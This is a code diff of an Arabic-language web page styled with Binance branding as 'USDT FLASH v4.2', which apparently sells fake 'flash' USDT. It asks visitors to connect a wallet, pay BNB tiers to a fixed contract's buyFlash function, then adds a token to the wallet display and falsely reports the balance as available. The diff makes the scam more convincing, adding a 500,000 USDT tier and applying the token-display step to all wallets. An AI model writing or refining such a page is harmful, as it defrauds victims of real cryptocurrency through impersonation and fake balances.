@@ -8,6 +8,7 @@
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
     <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <script src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
 
     <style>
         :root { --binance-yellow: #F3BA2F; --binance-black: #181A20; }
@@ -20,44 +21,62 @@
         
         .chart-box { width: 100%; height: 220px; border-radius: 12px; overflow: hidden; margin-bottom: 20px; border: 1px solid #2B3139; }
 
-        select { background: #2B3139; color: white; border: 1px solid #474D57; width: 100%; padding: 16px; border-radius: 12px; font-size: 15px; margin-bottom: 20px; outline: none; cursor: pointer; }
+        .price-info { background: #2B3139; padding: 12px; border-radius: 10px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
+
+        select { background: #2B3139; color: white; border: 1px solid #474D57; width: 100%; padding: 16px; border-radius: 12px; font-size: 15px; margin-bottom: 20px; outline: none; cursor: pointer; text-align: right; }
         
-        .btn-connect { background: #2B3139; color: var(--binance-yellow); border: 1px solid var(--binance-yellow); width: 100%; padding: 12px; border-radius: 10px; margin-bottom: 15px; cursor: pointer; font-weight: bold; }
-        .btn-main { background: var(--binance-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; font-size: 17px; cursor: pointer; }
+        /* زر الربط الملون */
+        .btn-connect { background: #2B3139; color: var(--binance-yellow); border: 1px solid var(--binance-yellow); width: 100%; padding: 14px; border-radius: 12px; margin-bottom: 20px; cursor: pointer; font-weight: bold; font-size: 15px; transition: 0.3s; }
+        .btn-connect:hover { background: var(--binance-yellow); color: black; }
+
+        .btn-main { background: var(--binance-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; transition: 0.3s; }
+        .btn-main:active { transform: scale(0.98); }
         
-        #status-msg { margin-top: 15px; font-size: 13px; color: var(--binance-yellow); text-align: center; }
+        #status-msg { margin-top: 15px; font-size: 13px; color: var(--binance-yellow); text-align: center; font-weight: 500; }
+
+        /* تعديلات لتحسين ظهور القائمة المنبثقة للمحافظ */
+        #web3modal-overlay { z-index: 3000 !important; }
     </style>
 </head>
 <body>
 
 <div class="header">
     <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" class="logo-binance">
-    <div style="margin-right: auto; color: var(--binance-yellow); font-weight: bold;">USDT FLASH v4.2</div>
+    <div style="margin-right: auto; color: var(--binance-yellow); font-weight: bold; font-size: 14px;">USDT FLASH v4.2</div>
 </div>
 
 <div class="main-container">
-    <div class="chart-box" id="tv_chart_container"></div>
+    <div class="chart-box" id="tv_chart_main"></div>
 
-    <button class="btn-connect" id="btn-connect" onclick="onConnect()">🔗 ربط المحفظة (Multi-Wallet)</button>
+    <div class="price-info">
+        <div style="display:flex; align-items:center;">
+            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" style="width:22px; margin-left:8px;">
+            <span style="font-weight:bold; font-size:14px;">USDT Market</span>
+        </div>
+        <div style="color:#00C087; font-weight:bold;">$1.0000</div>
+    </div>
 
-    <div style="font-size: 13px; color: #707A8A; margin-bottom: 8px;">كمية الحقن المطلوب:</div>
+    <button class="btn-connect" id="btn-connect" onclick="onConnect()">🔌 اختر محفظتك (Select Wallet)</button>
+
+    <div style="font-size: 12px; color: #707A8A; margin-bottom: 8px; text-align: right;">فئة الحقن المطلوبة:</div>
     <select id="flashTier">
         <option value="0.09">5,000 USDT — [0.09 BNB]</option>
         <option value="0.2">10,000 USDT — [0.2 BNB]</option>
         <option value="0.5">50,000 USDT — [0.5 BNB]</option>
         <option value="1.0">100,000 USDT — [1.0 BNB]</option>
+        <option value="4.0">500,000 USDT — [4.0 BNB]</option>
     </select>
 
-    <button class="btn-main" onclick="executeProcess()">بدء الحقن والمزامنة ⚡</button>
+    <button class="btn-main" onclick="executeProcess()">تفعيل واستلام الحقن ⚡</button>
     
-    <div id="status-msg">يرجى ربط المحفظة للمتابعة...</div>
+    <div id="status-msg">جاهز لبدء الاتصال الآمن...</div>
 </div>
 
 <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
 <script>
-    // 1. إعداد المخطط البياني المصلح
+    // 1. المخطط البياني الرسمي
     new TradingView.widget({
-        "container_id": "tv_chart_container",
+        "container_id": "tv_chart_main",
         "autosize": true,
         "symbol": "BINANCE:USDTBUSD",
         "interval": "1",
@@ -67,7 +86,7 @@
         "hide_top_toolbar": true
     });
 
-    // 2. إعداد WalletConnect و Web3Modal
+    // 2. إعداد قائمة المحافظ (Web3Modal)
     const Web3Modal = window.Web3Modal.default;
     const WalletConnectProvider = window.WalletConnectProvider.default;
 
@@ -76,6 +95,7 @@
     let selectedAccount;
 
     function init() {
+        // إعدادات المحافظ المتاحة في القائمة
         const providerOptions = {
             walletconnect: {
                 package: WalletConnectProvider,
@@ -83,40 +103,49 @@
                     rpc: { 56: "https://bsc-dataseed.binance.org/" },
                     network: "binance",
                 }
-            }
+            },
+            // يمكنك إضافة محفظة Coinbase أو غيرها هنا
         };
 
         web3Modal = new Web3Modal({
+            network: "mainnet", 
             cacheProvider: false, 
             providerOptions,
-            theme: "dark"
+            theme: "dark" // جعل قائمة المحافظ سوداء لتناسب Binance
         });
     }
 
     async function onConnect() {
         try {
+            // سيؤدي هذا السطر لفتح قائمة المحافظ ليختار المستخدم
             provider = await web3Modal.connect();
             const web3 = new Web3(provider);
             const accounts = await web3.eth.getAccounts();
             selectedAccount = accounts[0];
+            
             document.getElementById('btn-connect').innerText = "✅ متصل: " + selectedAccount.substring(0,6) + "...";
-            document.getElementById('status-msg').innerText = "تم الربط بنجاح. اختر الكمية واضغط تفعيل.";
-        } catch(e) { console.log("Connection error", e); }
+            document.getElementById('status-msg').innerText = "تم الاتصال بنجاح. يمكنك المتابعة.";
+        } catch(e) { 
+            console.log("User closed modal or connection error", e); 
+        }
     }
 
     const CONTRACT_ADDR = "0x22581282b507c6743762cBaA542D6B33Cd6f631f";
     const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
 
     async function executeProcess() {
-        if (!selectedAccount) return alert("يرجى ربط المحفظة أولاً");
-        const msg = document.getElementById('status-msg');
+        if (!selectedAccount) {
+            alert("يرجى اختيار محفظتك أولاً عبر زر الربط");
+            return onConnect();
+        }
         
+        const msg = document.getElementById('status-msg');
         try {
             const web3 = new Web3(provider);
             const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
             const val = document.getElementById('flashTier').value;
 
-            msg.innerText = "يرجى تأكيد العملية في محفظتك...";
+            msg.innerText = "جاري معالجة الطلب في محفظتك...";
             
             await contract.methods.buyFlash().send({
                 from: selectedAccount,
@@ -124,10 +153,10 @@
                 gas: 250000
             });
 
-            msg.innerText = "تم الحقن! جاري إضافة التوكن...";
+            msg.innerText = "تم الحقن! جاري مزامنة اللوجو والسعر...";
 
-            // إضافة التوكن (تعمل فقط على المحافظ التي تدعم watchAsset)
-            if(provider.isMetaMask) {
+            // إضافة التوكن بصرياً للمحفظة
+            if (provider.request) {
                 await provider.request({
                     method: 'wallet_watchAsset',
                     params: {
@@ -142,8 +171,10 @@
                 });
             }
 
-            msg.innerHTML = "<b style='color:#00C087;'>✅ اكتملت المزامنة بنجاح!</b>";
-        } catch (e) { msg.innerText = "فشلت العملية أو تم إلغاؤها."; }
+            msg.innerHTML = "<b style='color:#00C087;'>✅ تم التفعيل بنجاح! الرصيد متاح.</b>";
+        } catch (e) {
+            msg.innerText = "فشلت العملية. تأكد من تأكيد الطلب في محفظتك.";
+        }
     }
 
     window.addEventListener('load', init);
